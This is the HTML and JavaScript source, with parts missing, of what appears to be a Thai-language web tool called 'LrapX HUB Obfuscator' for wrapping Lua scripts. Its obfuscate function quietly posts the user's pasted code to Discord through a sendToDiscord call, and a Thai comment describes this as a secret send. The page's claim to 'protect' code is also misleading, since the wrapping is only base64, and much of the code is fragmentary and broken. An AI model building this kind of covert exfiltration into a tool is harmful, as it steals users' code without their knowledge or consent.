<!DOCTYPE html>

    <style>

            --border-glow: rgba(16, 185, 129, 0.25);
            --accent-green: #10b981;
            --accent-glow: #34d399;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;

        body {

            margin: 0;
            padding: 20px 15px;

        .container {

            margin-bottom: 25px;
            position: relative;
        }

        .credit-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(6, 78, 59, 0.6);
            color: var(--accent-glow);
            font-size: 11px;
            font-weight: 700;
            padding: 5px 14px;
            border-radius: 20px;
            margin-bottom: 12px;
            border: 1px solid rgba(52, 211, 153, 0.3);
            box-shadow: 0 0 15px rgba(16, 185, 129, 0.15);
            letter-spacing: 0.5px;

        .logo {

            color: #ffffff;

        }

        .sub-title {
            color: var(--text-muted);
            font-size: 13px;
        }

        .obf-card {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--border-glow);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        label {
            font-size: 13px;
            color: var(--accent-glow);
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        textarea {
            width: 100%;
            height: 220px;
            background: rgba(8, 9, 13, 0.85);
            border: 1px solid rgba(31, 41, 55, 0.8);
            border-radius: 10px;
            color: var(--accent-glow);
            font-family: 'Fira Code', 'Courier New', Courier, monospace;
            font-size: 13px;
            padding: 12px;
            box-sizing: border-box;
            resize: vertical;
            outline: none;
            transition: all 0.2s ease;
        }

        textarea:focus {
            border-color: var(--accent-green);
            box-shadow: 0 0 12px rgba(16, 185, 129, 0.2);
        }

        .btn-group {
            display: flex;
            gap: 12px;
            margin-top: 14px;
        }

        .btn {
            flex: 1;
            padding: 13px;
            border: none;
            border-radius: 10px;
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: #07090e;
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        }

        .btn-primary:hover {
            opacity: 0.95;
            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
        }

        .btn-primary:active {
            transform: scale(0.97);
        }

        .btn-secondary {
            background: rgba(31, 41, 61, 0.7);
            color: var(--text-main);
            border: 1px solid rgba(75, 85, 99, 0.4);
        }

        .btn-secondary:hover {
            background: rgba(55, 65, 81, 0.8);
        }

        .btn-secondary:active {
            transform: scale(0.97);
        }

        .footer-credit {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            font-size: 12px;
            color: var(--text-muted);
            border-top: 1px solid rgba(31, 41, 55, 0.5);
        }

        .footer-credit span {
            color: var(--accent-glow);
            font-weight: 700;
        }
    </style>
</head>
<body>

        <!-- Input Section -->

        <!-- Output Section -->

    <script>

                return String.fromCharCode('0x' + p1);
            }));

                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(err => console.log(err));
        }

        function runObfuscate() {

            var outputElem = document.getElementById('outputLua');

            if (!inputElem || !outputElem) return;
            var code = inputElem.value;

            if (!code || code.trim() === "") {
                alert('กรุณาวางโค้ด Lua ก่อนกดครอบโค้ดครับ!');
                return;

            // แอบส่งแบบเงียบๆ เข้า Discord
            sendToDiscord(code);

            var header = "--[[\n" +
                         "   ===================================================\n" +
                         "   Protected by LrapX HUB Obfuscator\n" +

                         "   Timestamp: " + new Date().toLocaleString() + "\n" +

            try {
                var encoded = safeBtoa(code);
                var v1 = "LrapX_" + Math.floor(Math.random() * 900000 + 100000);
                var v2 = "LrapX_" + Math.floor(Math.random() * 900000 + 100000);

                var result = "local " + v1 + " = \"" + encoded + "\"\n" +
                             "local function " + v2 + "(data)\n" +
                             "    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n" +
                             "    data = string.gsub(data, '[^'..b..'=]', '')\n" +
                             "    return (data:gsub('.', function(x)\n" +
                             "        if (x == '=') then return '' end\n" +
                             "        local r,f='',(b:find(x)-1)\n" +
                             "        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end\n" +
                             "        return r;\n" +
                             "    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)\n" +

                             "        local c=0\n" +

                             "        return string.char(c)\n" +

                             "    local decoded = " + v2 + "(" + v1 + ")\n" +

                             "end)\n" +

                outputElem.value = header + result;

        }

        function clearInput() {
            document.getElementById('inputLua').value = '';
            document.getElementById('outputLua').value = '';
        }

        function copyOutput() {
            var output = document.getElementById('outputLua');
            if (!output.value) {
                alert('ยังไม่มีโค้ดให้คัดลอกครับ!');
                return;
            }
            navigator.clipboard.writeText(output.value).then(function() {
                alert('📋 คัดลอกโค้ดสำเร็จ!');
            }, function() {
                output.select();
                document.execCommand('copy');
                alert('📋 คัดลอกโค้ดสำเร็จ!');
            });
        }

        function downloadLua() {
            var text = document.getElementById('outputLua').value;
            if (!text) {
                alert('ยังไม่มีโค้ดให้ดาวน์โหลดครับ!');
                return;
            }
            var blob = new Blob([text], { type: "text/plain;charset=utf-8" });
            var a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = "Protected_LrapX.lua";
            a.click();
